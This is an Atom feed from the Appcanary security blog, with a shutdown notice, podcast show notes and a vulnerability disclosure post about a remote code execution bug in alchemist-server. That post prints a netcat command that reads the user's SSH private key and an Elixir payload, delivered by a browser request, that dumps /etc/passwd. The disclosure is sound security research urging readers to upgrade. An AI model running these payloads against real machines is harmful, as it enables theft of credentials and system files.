<?xml version="1.0" encoding="UTF-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Appcanary</title>
  <subtitle>Appcanary makes sure you never run vulnerable software on your servers.</subtitle>
  <id>https://blog.appcanary.com</id>
  <link href="https://blog.appcanary.com"/>
  <link href="https://blog.appcanary.com/feed.xml" rel="self"/>
  <updated>2018-01-03T19:00:00-05:00</updated>
  <entry>
    <title>Goodbye Appcanary. Hello GitHub!</title>
    <link rel="alternate" href="https://blog.appcanary.com/2018/goodbye.html"/>
    <id>https://blog.appcanary.com/2018/goodbye.html</id>
    <published>2018-01-03T19:00:00-05:00</published>
    <updated>2018-02-05T12:32:31-05:00</updated>
    <author>
      <name>Team Appcanary</name>
    </author>
    <content type="html">&lt;p&gt;&lt;meta name="twitter:card" content="summary_large_image"/&gt;
&lt;meta name="twitter:site" content="@appcanary" /&gt;
&lt;meta name="twitter:title" content="Goodbye Appcanary. Hello GitHub!" /&gt;
&lt;meta name="twitter:description" content="Today, we’re excited to announce that we’re going to be able to build tools that impact almost every software developer on the planet — we’re joining GitHub." /&gt;
&lt;meta name="twitter:image" content="https://blog.appcanary.com/images/appcanary-joins-github-white2.png" /&gt;
&lt;meta property="og:title" content="Goodbye Appcanary. Hello GitHub!" /&gt;
&lt;meta property="og:description" content="aToday, we’re excited to announce that we’re going to be able to build tools that impact almost every software developer on the planet — we’re joining GitHub. " /&gt;
&lt;meta property="og:image" content="https://blog.appcanary.com/images/appcanary-joins-github-white2.png" /&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src="/images/appcanary-joins-github.png"&gt;&lt;/p&gt;

&lt;p&gt;From when we cofounded &lt;a href="https://www.rubysec.com"&gt;Rubysec&lt;/a&gt;, to building (the now defunct) &lt;a href="2015/hello-appcanary.html"&gt;Gemcanary&lt;/a&gt;, to &lt;a href="https://blog.appcanary.com/2015/hello-world.html"&gt;starting Appcanary&lt;/a&gt;, our goal from the beginning was to improve the world’s security by preventing the use of vulnerable software. At the time, this required placing a bet on building a certain kind of business, and for a variety of reasons that bet didn’t work out.&lt;/p&gt;

&lt;p&gt;However, this doesn&amp;rsquo;t mean that we&amp;rsquo;re giving up on the mission!&lt;/p&gt;

&lt;p&gt;Today, we’re excited to announce that we’re going to be able to build tools that impact almost every software developer on the planet — we’re joining GitHub. There, we’ll be working on expanding GitHub’s security tooling, like their recently announced &lt;a href="https://github.com/blog/2470-introducing-security-alerts-on-github"&gt;vulnerable dependency alerting&lt;/a&gt;.&lt;/p&gt;

&lt;p&gt;This means that we will be shutting Appcanary down. We&amp;rsquo;ve stopped accepting new signups, and in order to help our customers transition, we will officially stop operating the service on &lt;strong&gt;June 1st, 2018&lt;/strong&gt;.&lt;/p&gt;

&lt;p&gt;To our customers, we are sorry for the inconvenience and we would like to thank you for your trust over the past two and a half years. We’d also like to thank our investors, advisors and friends who have supported us.&lt;/p&gt;

&lt;p&gt;We’ll have more to say when the time comes. We look forward to our paths crossing again via our continued work on the GitHub platform.&lt;/p&gt;

&lt;p&gt;If you are interested in learning more about GitHub, please visit: &lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;&lt;a href="https://github.com"&gt;GitHub.com&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/blog/2470-introducing-security-alerts-on-github"&gt;GitHub Security Alerts&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Thank you,&lt;/p&gt;

&lt;p&gt;Max Veytsman and Phill Mendonça-Vieira&lt;/p&gt;

&lt;p&gt;&lt;hr&gt;&lt;/p&gt;

&lt;h2 id="questions-you-may-have"&gt;Questions you may have:&lt;/h2&gt;

&lt;p&gt;&lt;strong&gt;What is happening to the Appcanary products - API, Agent, and Monitor alerting?&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;All three products will be sunsetting on &lt;strong&gt;June 1st, 2018&lt;/strong&gt;.&lt;/p&gt;

&lt;p&gt;If you are currently a paying customer, you can continue to use and pay for the service until then. You may also, of course, cancel the service at any time by going to &lt;a href="https://appcanary.com/billing"&gt;the billing page&lt;/a&gt; and disabling the agent from your servers.&lt;/p&gt;

&lt;p&gt;We are not going to be accepting any new customers for these products.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;What is happening the the public vulnerability page?&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;&lt;a href="https://appcanary.com/vulns"&gt;The vulnerability browser&lt;/a&gt; will continue to operate until &lt;strong&gt;June 1st, 2018&lt;/strong&gt;.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;What is happening to isitvulnerable.com?&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;It will also continue to work until &lt;strong&gt;June 1st, 2018&lt;/strong&gt;, although we recommend you use &lt;a href="https://github.com/blog/2470-introducing-security-alerts-on-github"&gt;Github Security Alerts&lt;/a&gt; instead.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Wait, does this mean that GitHub will know about my security vulnerabilities?&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;No. Appcanary will not be sharing any data that can be used to identify our customers&amp;rsquo; vulnerabilities with GitHub.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Who do you recommend using instead of Appcanary?&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;Ruby coverage is live in GitHub’s Security Alerts feature. Today you can get PHP coverage from security partners like Gemnasium (and soon Snyk) in the &lt;a href="https://github.com/marketplace"&gt;GitHub Marketplace&lt;/a&gt;.&lt;/p&gt;

&lt;p&gt;For Ubuntu, Debian, CentOS, Amazon Linux, and Alpine Linux coverage, we recommend &lt;a href="https://spacewalkproject.github.io/"&gt;Spacewalk&lt;/a&gt;, &lt;a href="https://landscape.canonical.com/"&gt;Landscape&lt;/a&gt;, &lt;a href="https://coreos.com/clair/docs/latest/"&gt;CoreOS Clair&lt;/a&gt;, &lt;a href="https://www.tenable.com/products/nessus/nessus-agents"&gt;Nessus Agents&lt;/a&gt;, or &lt;a href="https://www.threatstack.com/"&gt;ThreatStack&lt;/a&gt;.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;What is GitHub’s Security Alerts offering?&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;GitHub currently sends alerts to public repositories and private repositories that have opted in about publicly disclosed CVEs for Javascript and Ruby. GitHub is soon adding Python support and expanding vulnerability coverage to include more of Appcanary’s database.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Who do we contact for product support until the product sunsets?&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;You can still reach us via the normal support channels or by emailing hello@appcanary.com&lt;/p&gt;
</content>
  </entry>
  <entry>
    <title>Podcast Episode 6 - Clojure, Ruby, Joy and Developer Happiness</title>
    <link rel="alternate" href="https://blog.appcanary.com/2017/clojure-ruby-joy-developer-happiness.html"/>
    <id>https://blog.appcanary.com/2017/clojure-ruby-joy-developer-happiness.html</id>
    <published>2017-09-17T20:00:00-04:00</published>
    <updated>2021-05-05T00:08:06-04:00</updated>
    <author>
      <name>Phillip Mendonça-Vieira</name>
    </author>
    <content type="html">&lt;p&gt;Max and Phill revisit leaving Clojure, and what joy and developer happiness actually means. Produced by &lt;a href="https://twitter.com/katiejensen"&gt;Katie Jensen&lt;/a&gt;.&lt;/p&gt;

&lt;p&gt;You can follow along on &lt;a href="https://itunes.apple.com/ca/podcast/appcanary-podcast/id1215405635"&gt;iTunes&lt;/a&gt;, or subscribe directly to &lt;a href="https://podcast.appcanary.com/podcast.rss"&gt;the feed&lt;/a&gt;.&lt;/p&gt;

&lt;audio controls preload="none" style="width: 100%;"&gt;
    &lt;source src="https://podcast.appcanary.com/mp3/appcanary-ep6.mp3" type="audio/mpeg"&gt;
    Your browser does not support the audio element.
&lt;/audio&gt;

&lt;h3 id="show-notes"&gt;Show Notes&lt;/h3&gt;

&lt;ul&gt;
&lt;li&gt;&lt;a href="https://blog.appcanary.com/2017/hard-isnt-simple-ruby-clojure.html"&gt;Simple Ain&amp;rsquo;t Easy, but Hard Ain&amp;rsquo;t Simple: Leaving Clojure for Ruby&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://lambdaisland.com/blog/25-05-2017-simple-and-happy-is-clojure-dying-and-what-has-ruby-got-to-do-with-it"&gt;Simple and Happy; is Clojure dying, and what has Ruby got to do with it?&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
</content>
  </entry>
  <entry>
    <title>Podcast Episode 5 - Spies and Voter Data</title>
    <link rel="alternate" href="https://blog.appcanary.com/2017/canada-c51-gop-voter-data.html"/>
    <id>https://blog.appcanary.com/2017/canada-c51-gop-voter-data.html</id>
    <published>2017-07-31T20:00:00-04:00</published>
    <updated>2021-05-05T00:08:03-04:00</updated>
    <author>
      <name>Phillip Mendonça-Vieira</name>
    </author>
    <content type="html">&lt;p&gt;Phill and Max discuss new spying powers in Canada, and the leak of GOP voter data. Produced by &lt;a href="https://twitter.com/katiejensen"&gt;Katie Jensen&lt;/a&gt;.&lt;/p&gt;

&lt;p&gt;You can follow along on &lt;a href="https://itunes.apple.com/ca/podcast/appcanary-podcast/id1215405635"&gt;iTunes&lt;/a&gt;, or subscribe directly to &lt;a href="https://podcast.appcanary.com/podcast.rss"&gt;the feed&lt;/a&gt;.&lt;/p&gt;

&lt;audio controls preload="none" style="width: 100%;"&gt;
    &lt;source src="https://podcast.appcanary.com/mp3/appcanary-ep5.mp3" type="audio/mpeg"&gt;
    Your browser does not support the audio element.
&lt;/audio&gt;

&lt;h3 id="show-notes"&gt;Show Notes&lt;/h3&gt;

&lt;ul&gt;
&lt;li&gt;&lt;a href="https://news.vice.com/story/the-trudeau-government-peels-back-bill-c-51-mostly"&gt;The Trudeau government peels back bill C-51 — mostly&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://ipolitics.ca/2017/06/20/goodale-pitches-panel-of-experts-in-major-national-security-reform-bill/"&gt;CSE getting &amp;lsquo;proactive&amp;rsquo; mandate overhaul in major national security reform bill&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://www.nationalobserver.com/2017/06/20/news/goodale-asks-parliament-expand-electronic-spying-powers"&gt;Goodale asks Parliament to expand electronic spying powers&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;p&gt;&lt;a href="http://www.cbc.ca/news/canada/manitoba/canada-csis-metadata-collection-privacy-concerns-bill-c51-1.3798564"&gt;CSIS, Bill C-51 and Canada&amp;rsquo;s growing metadata collection mess&lt;/a&gt;&lt;/p&gt;&lt;/li&gt;
&lt;li&gt;&lt;p&gt;&lt;a href="https://www.upguard.com/breaches/the-rnc-files"&gt;The RNC Files: Inside the Largest US Voter Data Leak&lt;/a&gt;&lt;/p&gt;&lt;/li&gt;
&lt;/ul&gt;
</content>
  </entry>
  <entry>
    <title>Hacking your Elixir Editor</title>
    <link rel="alternate" href="https://blog.appcanary.com/2017/hacking-your-elixir-editor.html"/>
    <id>https://blog.appcanary.com/2017/hacking-your-elixir-editor.html</id>
    <published>2017-07-27T20:00:00-04:00</published>
    <updated>2021-05-05T00:16:24-04:00</updated>
    <author>
      <name>Max Veytsman</name>
    </author>
    <content type="html">&lt;p&gt;I&amp;rsquo;ve been playing with Elixir recently, and came across a remote code execution bug in the developer tools. You know, as one does.&lt;/p&gt;

&lt;p&gt;Before we continue, a warning: if you use Vim and have ever edited Elixir files &lt;strong&gt;stop what you&amp;rsquo;re doing and upgrade &lt;a href="https://github.com/slashmili/alchemist.vim"&gt;alchemist.vim&lt;/a&gt; to 2.8.0&lt;/strong&gt;. Seriously, go do it, right now.&lt;/p&gt;

&lt;p&gt;Done? Okay, let&amp;rsquo;s take it from the top. If you want to implement nice editor support for a language, and provide things like code-completion or jump-to-definition, you need some way to introspect both the source code being edited and the language&amp;rsquo;s runtime environment to figure out what suggestions to give to your users.&lt;/p&gt;

&lt;p&gt;There&amp;rsquo;s a package called &lt;a href="https://github.com/tonini/alchemist.el"&gt;alchemist&lt;/a&gt; that provides Elixir support for Emacs. It has nice features like code-completion, and jump-to-definition, and, thereofre, it understands Elixir code and can read through a project&amp;rsquo;s dependencies and stuff like that. A common pattern when writing editor plugins is to build a little background program in the language you&amp;rsquo;re targeting that can introspect the runtime and tell the editor where symbols are defined and help with code completion. Alchemist does this with &lt;a href="https://github.com/tonini/alchemist-server"&gt;alchemist-server&lt;/a&gt;.&lt;/p&gt;

&lt;p&gt;Alchemist-server is also used by the Vim plugin, &lt;a href="https://github.com/slashmili/alchemist.vim"&gt;alchemist.vim&lt;/a&gt;. While Emacs talks to alchemist-server via STDIN/STDOUT, the Vim plugin uses a TCP server to process commands from Vim.&lt;/p&gt;

&lt;h1 id="the-bug"&gt;The bug&lt;/h1&gt;

&lt;p&gt;I can&amp;rsquo;t claim credit for the original bug. It was &lt;a href="https://github.com/tonini/alchemist-server/issues/14"&gt;reported&lt;/a&gt; by &lt;a href="https://github.com/ivan"&gt;Ivan Kozik&lt;/a&gt; back in February.&lt;/p&gt;

&lt;p&gt;The issue is that alchemist-server accepted &lt;code&gt;EVAL&lt;/code&gt; as a command and listened unauthenticated on all interfaces. This means that anyone in the same coffee shop as you can eval arbitrary Elixir code on your computer if they can guess the &lt;a href="https://en.wikipedia.org/wiki/Ephemeral_port"&gt;ephemeral port&lt;/a&gt; the server is running on.&lt;/p&gt;

&lt;p&gt;This is really bad, and unfortunately had not been addressed since the issue was reported. I think this bug wasn&amp;rsquo;t patched immediately for three reasons:&lt;/p&gt;

&lt;ol&gt;
&lt;li&gt;There wasn&amp;rsquo;t consensus on what the correct fix was. Do we listen on localhost only? On a socket? Sign and MAC the command? If we do that, what key do we use?&lt;/li&gt;
&lt;li&gt;The severity of the bug wasn&amp;rsquo;t made clear. While it exposed you to a remote attacker over the same network, Ivan initially thought that you would need a &lt;a href="https://en.wikipedia.org/wiki/DNS_rebinding"&gt;DNS rebinding&lt;/a&gt; attack to exploit the bug via a browser. This is theoretical and hard to explain, let alone pull off&lt;sup id="fnref1"&gt;&lt;a href="#fn1" rel="footnote"&gt;1&lt;/a&gt;&lt;/sup&gt;.&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;This is a super serious bug, and I wanted to see this bug fixed as quickly as possible. I subscribe to the Church of &lt;a href="https://www.nostarch.com/gtfo"&gt;Proof of Concept or GTFO&lt;/a&gt;, so it was time to demonstrate just bad this bug actually was.&lt;/p&gt;

&lt;h1 id="the-original-exploit"&gt;The original exploit&lt;/h1&gt;

&lt;p&gt;Ivan&amp;rsquo;s original exploit takes advantage of the fact that alchemist-server uses &lt;code&gt;eval-string&lt;/code&gt; to process arguments in several cases and it contains a &lt;code&gt;EVAL&lt;/code&gt; command for evaluating files, probably for loading modified files into your repl environment. He sends a command that uses the &lt;code&gt;eval-string&lt;/code&gt;ed portion to write a malicious Elixir script to a file and then executes it, with the results returned to the user.&lt;/p&gt;

&lt;p&gt;Assuiming &lt;code&gt;PORT&lt;/code&gt; is the ephemeral port the server is running on, his exploit looks like this:&lt;/p&gt;
&lt;pre class="highlight shell"&gt;&lt;code&gt;&lt;span class="nb"&gt;echo&lt;/span&gt; &lt;span class="s1"&gt;'EVAL File.write!("/tmp/payload",
"File.read!(Path.expand(~s(~/.ssh/id_rsa)))");
{:eval, "/tmp/payload"}'&lt;/span&gt; | nc 127.0.0.1 PORT
&lt;/code&gt;&lt;/pre&gt;

&lt;ul&gt;
&lt;li&gt;&lt;code&gt;EVAL&lt;/code&gt; is a command for the Elixir server.&lt;/li&gt;
&lt;li&gt;&lt;code&gt;File.write!(&amp;quot;/tmp/payload&amp;quot;, &amp;quot;File.read!(Path.expand(~s(~/.ssh/id_rsa)))&amp;quot;);&lt;/code&gt; is the part that&amp;rsquo;s processed by &lt;code&gt;eval-string&lt;/code&gt;. It writes a malicious elixir script to &lt;code&gt;/tmp/payload&lt;/code&gt;. The script itself returns the contents of the user&amp;rsquo;s ssh private key.&lt;/li&gt;
&lt;li&gt;&lt;code&gt;{:eval, &amp;quot;/tmp/payload&amp;quot;}&lt;/code&gt; tells the server to evaluate the file in which the malicious script was written.&lt;/li&gt;
&lt;/ul&gt;

&lt;h1 id="the-danger-of-line-based-protocols"&gt;The danger of line based protocols&lt;/h1&gt;

&lt;p&gt;I know what you&amp;rsquo;re thinking: &amp;ldquo;it&amp;rsquo;s really too bad that alchemist-server is evaling things to begin with&amp;rdquo;. And, you&amp;rsquo;re dead wrong.&lt;/p&gt;

&lt;p&gt;It&amp;rsquo;s perfectly fine for developer tools to execute code sent to them by a user; actually, most developer tools are designed specifically to evaluate arbitrary code in one way or another. The problem is that it&amp;rsquo;s accepting code to be evaled over &lt;em&gt;a TCP connection&lt;/em&gt;.&lt;/p&gt;

&lt;p&gt;First, I booted up the server, and then started talking to it using netcat:&lt;/p&gt;
&lt;pre class="highlight shell"&gt;&lt;code&gt;&lt;span class="gp"&gt;$ &lt;/span&gt;&lt;span class="nb"&gt;echo&lt;/span&gt; &lt;span class="s1"&gt;'PING'&lt;/span&gt; | nc localhost 59533
PONG
END-OF-PING

&lt;span class="gp"&gt;$ &lt;/span&gt;&lt;span class="nb"&gt;echo&lt;/span&gt; &lt;span class="s2"&gt;"NOTAREALCOMMAND"&lt;/span&gt; | nc localhost 59555
&lt;span class="c"&gt;# No output&lt;/span&gt;

&lt;span class="gp"&gt;$ &lt;/span&gt;&lt;span class="nb"&gt;printf&lt;/span&gt; &lt;span class="s2"&gt;"NOTAREALCOMMAND&lt;/span&gt;&lt;span class="se"&gt;\n&lt;/span&gt;&lt;span class="s2"&gt;PING&lt;/span&gt;&lt;span class="se"&gt;\n&lt;/span&gt;&lt;span class="s2"&gt;"&lt;/span&gt; | nc localhost 59609
PONG
END-OF-PING
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;This is where things get real bad for alchemist-server. We&amp;rsquo;re dealing with a line based protocol, and what&amp;rsquo;s more, it&amp;rsquo;s ignoring&lt;sup id="fnref2"&gt;&lt;a href="#fn2" rel="footnote"&gt;2&lt;/a&gt;&lt;/sup&gt; commands it doesn&amp;rsquo;t understand. You know what else is a line-based protocol? HTTP.&lt;/p&gt;

&lt;p&gt;That means we can get a browser to issue a request to localhost and alchemist-server will ignore all the headers and HTTP formalities and happily execute an EVAL command if we put it on its own line.&lt;/p&gt;

&lt;p&gt;Interestingly enough, this is a case where security considerations outweigh &lt;a href="https://en.wikipedia.org/wiki/Robustness_principle"&gt;Postel&amp;rsquo;s Principle&lt;/a&gt;:&lt;/p&gt;

&lt;blockquote&gt;
&lt;p&gt;Be conservative in what you do, be liberal in what you accept from others&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;In this case, being liberal in what you accept leads to accepting messages from places you really shouldn&amp;rsquo;t.&lt;/p&gt;

&lt;h1 id="cross-origin-resource-sharing"&gt;Cross-origin resource sharing&lt;/h1&gt;

&lt;p&gt;We&amp;rsquo;ve established that the server will accept HTTP requests from a browser. Now the trick is to get the browser to send one. I decided to use Javascript to send an &lt;a href="https://developer.mozilla.org/en/docs/Web/API/XMLHttpRequest"&gt;XHR&lt;/a&gt; so that I had a good chance of being able to process the response from the server. If I just wanted to execute some code on a victim&amp;rsquo;s machine, embedding a form or an image with the right payload would have worked too.&lt;/p&gt;

&lt;p&gt;In order to use XHR, we need to get around Cross-Origin Resource Sharing (CORS). This is the policy that governs under what conditions a browser will make a request to a resource, and under what conditions the output will be returned back to the Javascript function that made the request. There is a default policy, and it can be changed by the server using special headers&lt;sup id="fnref3"&gt;&lt;a href="#fn3" rel="footnote"&gt;3&lt;/a&gt;&lt;/sup&gt;.&lt;/p&gt;

&lt;p&gt;The first thing that happens is that the browser decides if it can make a request. If the request contains these special headers, or uses an HTTP method other than GET, HEAD, or POST, the browser will send a &lt;a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Access_control_CORS#Preflighted_requests"&gt;preflighted request&lt;/a&gt;. This is an OPTIONS request that asks the server if it will accept the upcoming request.&lt;/p&gt;

&lt;p&gt;We don&amp;rsquo;t want this, so we have to send a so-called &amp;ldquo;simple request&amp;rdquo;. A POST request with a content-type of &amp;ldquo;text/plain&amp;rdquo; and &lt;code&gt;EVAL ...&lt;/code&gt; in the data is &amp;ldquo;simple&amp;rdquo; and not be preflighted.&lt;/p&gt;

&lt;p&gt;The next step is getting passed the Access-Control header. By default, your browser won&amp;rsquo;t return the results of an XHR request unless it&amp;rsquo;s to the same origin as the script that&amp;rsquo;s making it, or the server has an Access-Control header that allows the script&amp;rsquo;s origin. One thing to note is that this is happening &lt;em&gt;after&lt;/em&gt; the request is made. So, if I have some malicious code that will ransomware your computer, it will still be executed, even if the browser script that made the request won&amp;rsquo;t be able to see the response. It&amp;rsquo;s especially unimportant in the case of remote code execution, because I can exfiltrate data by having my malicious payload make a request back to me by itself.&lt;/p&gt;

&lt;p&gt;Nevertheless, setting up a server to listen to the response requires effort, and I wanted a seamless POC. Luckily, our malicious payload&amp;rsquo;s response was going to be interpreted as a HTTP response to the browser, so all I had to do was return a string that looks like:&lt;/p&gt;
&lt;pre class="highlight plaintext"&gt;&lt;code&gt;HTTP/1.1 200 OK
Access-Control-Allow-Origin: *

The browser will now see this as a response to its XHR request.
&lt;/code&gt;&lt;/pre&gt;

&lt;h1 id="boom"&gt;Boom&lt;/h1&gt;

&lt;p&gt;And here&amp;rsquo;s the full payload&lt;/p&gt;
&lt;pre class="highlight elixir"&gt;&lt;code&gt;&lt;span class="c1"&gt;# Write the following script to /tmp/payload&lt;/span&gt;
&lt;span class="no"&gt;EVAL&lt;/span&gt; &lt;span class="no"&gt;File&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;write!&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="sd"&gt;"&lt;/span&gt;&lt;span class="s2"&gt;/tmp/payload"&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
  &lt;span class="c1"&gt;# HTTP response header&lt;/span&gt;
  &lt;span class="err"&gt;~&lt;/span&gt;&lt;span class="no"&gt;S&lt;/span&gt;&lt;span class="o"&gt;|&lt;/span&gt;&lt;span class="no"&gt;IO&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;puts&lt;/span&gt; &lt;span class="sd"&gt;"&lt;/span&gt;&lt;span class="s2"&gt;HTTP/1.1 200 OK"&lt;/span&gt;
  &lt;span class="c1"&gt;# \n - encoded in a way that won't be parsed as a new line&lt;/span&gt;
  &lt;span class="o"&gt;&amp;lt;&amp;gt;&lt;/span&gt; &lt;span class="no"&gt;List&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;to_string&lt;/span&gt;&lt;span class="p"&gt;([&lt;/span&gt;&lt;span class="m"&gt;10&lt;/span&gt;&lt;span class="p"&gt;])&lt;/span&gt;
  &lt;span class="c1"&gt;# CORS header&lt;/span&gt;
  &lt;span class="o"&gt;&amp;lt;&amp;gt;&lt;/span&gt; &lt;span class="sd"&gt;"&lt;/span&gt;&lt;span class="s2"&gt;Access-Control-Allow-Origin: *"&lt;/span&gt;
  &lt;span class="c1"&gt;# \r\n\r\n - see above&lt;/span&gt;
  &lt;span class="o"&gt;&amp;lt;&amp;gt;&lt;/span&gt; &lt;span class="no"&gt;List&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;to_string&lt;/span&gt;&lt;span class="p"&gt;([&lt;/span&gt;&lt;span class="m"&gt;13&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="m"&gt;10&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="m"&gt;13&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="m"&gt;10&lt;/span&gt;&lt;span class="p"&gt;])&lt;/span&gt;
  &lt;span class="c1"&gt;# Insert the contents of /etc/passwrd&lt;/span&gt;
  &lt;span class="o"&gt;&amp;lt;&amp;gt;&lt;/span&gt; &lt;span class="no"&gt;File&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;read!&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="no"&gt;Path&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;expand&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="err"&gt;~&lt;/span&gt;&lt;span class="n"&gt;s&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;etc&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;passwd&lt;/span&gt;&lt;span class="p"&gt;)))&lt;/span&gt;
  &lt;span class="c1"&gt;# \r\n\r\n - see above&lt;/span&gt;
  &lt;span class="o"&gt;&amp;lt;&amp;gt;&lt;/span&gt; &lt;span class="no"&gt;List&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;to_string&lt;/span&gt;&lt;span class="p"&gt;([&lt;/span&gt;&lt;span class="m"&gt;13&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="m"&gt;10&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="m"&gt;13&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="m"&gt;10&lt;/span&gt;&lt;span class="p"&gt;])&lt;/span&gt;&lt;span class="o"&gt;|&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
  &lt;span class="c1"&gt;# Execute the above script and return the result&lt;/span&gt;
&lt;span class="p"&gt;{&lt;/span&gt;&lt;span class="ss"&gt;:eval&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="sd"&gt;"&lt;/span&gt;&lt;span class="s2"&gt;/tmp/payload"&lt;/span&gt;&lt;span class="p"&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;This is what it looks like when wrapped in HTML/Javascript:&lt;/p&gt;

&lt;video preload="none" src="/videos/alchemist_server.webm" width="640" height="360" controls&gt;
&lt;/video&gt;

&lt;p&gt;Thanks for reading, and make sure you update your alchemist-server!&lt;/p&gt;

&lt;div class="footnotes"&gt;
&lt;hr&gt;
&lt;ol&gt;

&lt;li id="fn1"&gt;
&lt;p&gt;Case in point, the &lt;a href="http://searchsecurity.techtarget.com/definition/DNS-rebinding-attack"&gt;first google hit&lt;/a&gt; confuses for DNS rebinding confuses the attack technique with something you can do with it &amp;mdash; using javascript to exploit default passwords on home routers from a browser.&amp;nbsp;&lt;a href="#fnref1" rev="footnote"&gt;&amp;#8617;&lt;/a&gt;&lt;/p&gt;
&lt;/li&gt;

&lt;li id="fn2"&gt;
&lt;p&gt;You may have noticed, I used &lt;code&gt;printf&lt;/code&gt; not &lt;code&gt;echo&lt;/code&gt; in the last example so that my &lt;code&gt;\n&lt;/code&gt;s would be rendered correctly.&amp;nbsp;&lt;a href="#fnref2" rev="footnote"&gt;&amp;#8617;&lt;/a&gt;&lt;/p&gt;
&lt;/li&gt;

&lt;li id="fn3"&gt;
&lt;p&gt;If you want to learn more about other security releated headers, you can read my &lt;a href="https://blog.appcanary.com/2017/http-security-headers.html"&gt;guide&lt;/a&gt;&amp;nbsp;&lt;a href="#fnref3" rev="footnote"&gt;&amp;#8617;&lt;/a&gt;&lt;/p&gt;
&lt;/li&gt;

&lt;/ol&gt;
&lt;/div&gt;
</content>
  </entry>
  <entry>
    <title>Podcast Episode 4 - Leakers and Phishers</title>
    <link rel="alternate" href="https://blog.appcanary.com/2017/reality-winner-nsa-citizenlab.html"/>
    <id>https://blog.appcanary.com/2017/reality-winner-nsa-citizenlab.html</id>
    <published>2017-07-13T20:00:00-04:00</published>
    <updated>2021-05-05T00:07:36-04:00</updated>
    <author>
      <name>Phillip Mendonça-Vieira</name>
    </author>
    <content type="html">&lt;p&gt;Max and Phill talk about Reality Winner&amp;rsquo;s bad opsec and the huge phishing campaign unearthed by Citizenlab. Produced by &lt;a href="https://twitter.com/katiejensen"&gt;Katie Jensen&lt;/a&gt;.&lt;/p&gt;

&lt;p&gt;You can follow along on &lt;a href="https://itunes.apple.com/ca/podcast/appcanary-podcast/id1215405635"&gt;iTunes&lt;/a&gt;, or subscribe directly to &lt;a href="https://podcast.appcanary.com/podcast.rss"&gt;the feed&lt;/a&gt;.&lt;/p&gt;

&lt;audio controls preload="none" style="width: 100%;"&gt;
    &lt;source src="https://podcast.appcanary.com/mp3/appcanary-ep4.mp3" type="audio/mpeg"&gt;
    Your browser does not support the audio element.
&lt;/audio&gt;

&lt;h3 id="show-notes"&gt;Show Notes&lt;/h3&gt;

&lt;ul&gt;
&lt;li&gt;&lt;p&gt;&lt;a href="https://medium.com/@thegrugq/real-talk-on-reality-cf07cbb78530"&gt;Real Talk on Reality&lt;/a&gt;&lt;/p&gt;&lt;/li&gt;
&lt;li&gt;&lt;p&gt;&lt;a href="https://citizenlab.ca/2017/05/tainted-leaks-disinformation-phish/"&gt;TAINTED LEAKS: Disinformation and Phishing With a Russian Nexus&lt;/a&gt;&lt;/p&gt;&lt;/li&gt;
&lt;/ul&gt;
</content>
  </entry>
  <entry>
    <title>Podcast Episode 3 - Breitbart and Shopify</title>
    <link rel="alternate" href="https://blog.appcanary.com/2017/podcast-breitbart-shopify.html"/>
    <id>https://blog.appcanary.com/2017/podcast-breitbart-shopify.html</id>
    <published>2017-05-25T20:00:00-04:00</published>
    <updated>2021-05-05T00:07:33-04:00</updated>
    <author>
      <name>Phillip Mendonça-Vieira</name>
    </author>
